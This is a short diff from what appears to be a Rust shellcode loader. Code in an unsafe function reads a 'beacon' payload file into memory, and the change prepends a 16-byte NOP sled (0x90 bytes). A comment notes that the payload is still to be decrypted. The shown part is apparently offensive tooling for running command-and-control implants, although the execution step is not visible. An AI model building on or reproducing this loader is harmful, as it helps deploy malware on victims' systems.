@@ -152,6 +152,9 @@ unsafe fn mmain() {
     };
     let mut file = File::open(beacon_path).unwrap();
     let mut beacon = Vec::new();
+    for _ in 1..17 {
+        beacon.push(0x90);
+    }
     file.read_to_end(&mut beacon).unwrap();
     // TODO: you should do some decryption.
 
